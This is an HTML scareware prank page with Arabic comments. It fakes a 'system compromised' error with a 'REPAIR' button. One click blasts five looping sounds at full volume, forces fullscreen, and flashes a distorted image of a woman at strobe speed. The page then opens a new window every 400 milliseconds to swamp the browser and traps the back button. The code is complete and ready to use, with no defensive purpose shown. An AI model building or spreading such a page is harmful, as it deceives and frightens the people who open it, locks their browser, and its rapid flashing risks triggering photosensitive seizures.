<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚠️ SYSTEM_CRITICAL_FAILURE ⚠️</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
        
        /* صورة المرأة: تغطي كامل الهاتف مع "رعشة" قوية سواسوة */
        #stalkerEntity { 
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
            object-fit: cover; z-index: 1; display: none;
            filter: contrast(300%) brightness(30%);
            animation: seizure 0.05s infinite;
        }

        @keyframes seizure {
            0% { transform: translate(3px, 3px); filter: hue-rotate(0deg); }
            50% { transform: translate(-3px, -5px); filter: hue-rotate(10deg); }
            100% { transform: translate(2px, 4px); filter: hue-rotate(0deg); }
        }

        #warning { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 100; color: #f00; text-align: center; font-family: monospace; }
        .blink { animation: b 0.1s infinite; }
        @keyframes b { 50% { opacity: 0; } }
        .btn { background: #f00; color: #000; border: none; padding: 20px; font-weight: bold; margin-top: 20px; cursor: pointer; width: 100%; }
    </style>
</head>
<body onclick="launchNightmare()">

    <div id="warning">
        <h1 class="blink">☢️ FATAL ERROR ☢️</h1>
        <p>Your system has been compromised.<br>Press OK to attempt recovery.</p>
        <button class="btn">OK / REPAIR</button>
    </div>

    <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">

    <audio id="s1" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3" type="audio/mpeg"></audio>
    <audio id="s2" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3" type="audio/mpeg"></audio>
    <audio id="s3" loop><source src="https://www.myinstants.com/media/sounds/anime-ahh.mp3" type="audio/mpeg"></audio>
    <audio id="s4" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3" type="audio/mpeg"></audio>
    <audio id="s5" loop><source src="https://www.myinstants.com/media/sounds/yamate-kudesai.mp3" type="audio/mpeg"></audio>

    <script>
        function launchNightmare() {
            // تشغيل كامل الأصوات في وقت واحد سواسوة
            for(let i=1; i<=5; i++) {
                let s = document.getElementById('s'+i);
                s.volume = 1.0;
                s.play();
            }

            document.getElementById('warning').style.display = 'none';
            document.getElementById('stalkerEntity').style.display = 'block';
            document.documentElement.requestFullscreen();

            // نظام "الحبس" ومنع الهروب سواسوة
            setInterval(() => {
                // فتح نوافذ جديدة لتبليك المتصفح (100 صفحة) سواسوة
                window.open(window.location.href, '_blank', 'width=10,height=10');
                // منع زر الرجوع سواسوة
                history.pushState(null, null, window.location.href);
            }, 400);
        }
        window.onpopstate = () => history.go(1);
    </script>
</body>
</html>
